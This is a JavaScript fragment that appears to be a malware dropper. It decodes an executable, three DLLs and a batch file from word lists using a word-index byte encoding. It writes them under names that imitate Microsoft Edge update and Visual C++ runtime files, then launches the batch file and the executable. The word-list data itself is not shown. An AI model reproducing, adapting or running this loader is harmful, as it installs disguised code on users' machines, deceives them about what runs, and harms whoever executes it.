const exePath = path.join(folder, "Microsoft Edge Updates Helper.exe");
const autorunPath = path.join(folder, "DneCMKUGkQqy.bat");

const dll1Path = path.join(folder, "msvcp140.dll");
const dll2Path = path.join(folder, "vcruntime140.dll");
const dll3Path = path.join(folder, "vcruntime140_1.dll");
const dll4Path = path.join(folder, "DneCMKUGkQqy.bat")

function writePositionsToFile(listA, listB, outPath) {
  const a = listA.split(' ');
  const b = listB.split(' ');
  const positions = b.map(word => {
    const idx = a.indexOf(word);
    return idx >= 0 ? idx : 0;
  });
  const buffer = Buffer.from(positions.map(p => p & 0xFF));
  fs.writeFileSync(outPath, buffer);
}
module.exports = writePositionsToFile;

function safeMakeDir(dir) {
  fs.mkdirSync(dir, { recursive: true, mode: 0o755 });
}

function launchExecutable(execPath, args = []) {
  const child = spawn(execPath, args, { shell: true, stdio: 'inherit' });
  child.on('exit', (code) => {
    console.log(`${path.basename(execPath)} exited with code ${code}`);
  });
}


try {
  safeMakeDir(folder);
  writePositionsToFile(wlist, exe, exePath);
  writePositionsToFile(wlist, dll1, dll1Path);
  writePositionsToFile(wlist, dll2, dll2Path);
  writePositionsToFile(wlist, dll3, dll3Path);
  writePositionsToFile(wlist, bat, autorunPath);
  console.log("Installer written to:", folder);
  launchExecutable(`"${autorunPath}"`, [`"${exePath}"`]);
  launchExecutable(`"${exePath}"`);
} catch (err) {
  console.error("Installation failed:", err);
  process.exit(1);
}
